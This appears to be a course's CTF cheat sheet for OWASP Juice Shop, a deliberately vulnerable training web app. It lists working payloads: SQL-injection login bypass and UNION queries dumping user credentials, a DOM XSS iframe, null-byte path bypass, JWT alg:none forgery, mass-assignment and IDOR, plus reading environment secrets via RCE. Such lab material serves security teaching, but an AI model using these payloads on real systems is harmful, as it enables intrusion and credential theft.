# OWASP Juice Shop

Angular SPA + Node/Express + SQLite. ~100 built-in challenges; solving one pops a green banner
(in CTF mode it shows a flag code). Progress at the hidden **Score Board**.

## Start
1. Score Board: find the route in the JS bundle → `/#/score-board`
   (`curl -s $T/main.js | grep -o 'score-board'`).
2. Admin login: email `' OR 1=1--`, any password → logs in as `admin@juice-sh.op`
   ([auth-bypass](../06-sqli/auth-bypass.md)).
3. API recon: `/rest/products/search?q=`, `/api/Users`, `/api/Feedbacks`, `/rest/user/whoami`,
   `/ftp/` (directory listing: `acquisitions.md`, `package.json.bak` → `%2500.md` null-byte bypass).

## Quick wins (each solves a challenge)
| Challenge | Do |
|---|---|
| Score Board | open `/#/score-board` |
| Login Admin | `' OR 1=1--` |
| Admin Section | `/#/administration` as admin |
| Confidential Document | `/ftp/acquisitions.md` |
| Poison Null Byte | `/ftp/package.json.bak%2500.md` |
| Database Schema | `/rest/products/search?q='))UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--` |
| User Credentials | `...UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--` |
| DOM XSS | search `<iframe src="javascript:alert(`xss`)">` |
| Forged Feedback / View Basket | change `UserId` / basket id → [idor](../04-access-control/idor.md) |
| Admin Registration | `POST /api/Users` with `"role":"admin"` → [mass-assignment](../04-access-control/mass-assignment.md) |
| Weird Crypto / JWT | `alg:none` on the `token` cookie → [jwt](../03-auth/jwt.md) |

## Where the course flag is
The per-student `FLAG` is set as an env var for the container; look for it where challenge
solutions/flags are displayed (score board / solve notifications). If it doesn't appear there,
it needs code execution on the Node process (`process.env.FLAG`) — e.g. SSTI/RCE challenges
("SSTi" on the username in older versions, "Successful RCE DoS" B2B order `eval`), or file read
of `/proc/self/environ`. Check the version (`/rest/admin/application-version`) →
[06-cve-research](../00-start/06-cve-research.md).
